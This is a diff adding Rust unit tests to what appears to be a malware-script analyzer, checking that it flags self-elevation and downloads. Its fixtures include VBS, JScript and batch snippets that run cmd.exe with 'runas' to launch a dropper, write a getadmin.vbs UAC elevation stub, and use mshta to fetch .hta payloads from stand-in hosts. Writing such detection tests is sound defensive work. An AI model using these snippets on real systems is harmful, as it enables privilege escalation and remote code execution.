@@ -1566,6 +1566,61 @@ runas /user:Administrator "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
     }
 
     #[test]
+    fn vbs_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_vbs.push(script.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args.as_deref().is_some_and(|value| value.contains("dropper.bat"))
+            )),
+            "VBS ShellExecute runas SelfElevation not detected: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"WScript.CreateObject("Shell.Application").ShellExecute("cmd.exe", "/c C:\\Users\\me\\dropper.bat", "", "runas", 1);"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_jscript.push(script.to_vec());
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args.as_deref().is_some_and(|value| value.contains("dropper.bat"))
+            )),
+            "JS ShellExecute runas SelfElevation not detected: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn echoed_vbs_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"@echo off
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args.as_deref().is_some_and(|value| value.contains("%~s0"))
+            )),
+            "echoed VBS ShellExecute runas SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn remote_exec_mixed_case_tokens_emit_trait() {
         let script = b"@echo off\r\nwInRm InVoKe 10.0.0.5\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
@@ -29983,6 +30038,59 @@ task["Run"]("mshta js-bracket-run-fp.example/payload.hta");"#
                     if src == "http://js-bracket-run-fp.example/payload.hta"
             )),
             "generic JS bracket Run should not be treated as WSH execution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell").ShellExecute("mshta", "js-shellexecute.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://js-shellexecute.example/payload.hta"
+            )),
+            "JS WScript.Shell.ShellExecute schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_bracket_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell")["ShellExecute"]("mshta", "js-bracket-shellexecute.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://js-bracket-shellexecute.example/payload.hta"
+            )),
+            "JS WScript.Shell bracket ShellExecute schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_shell_application_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"WScript.CreateObject("Shell.Application").ShellExecute("mshta", "js-shell-application.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://js-shell-application.example/payload.hta"
+            )),
+            "JS Shell.Application.ShellExecute schemeless URL missed: {:?}",
             env.traits
         );
     }
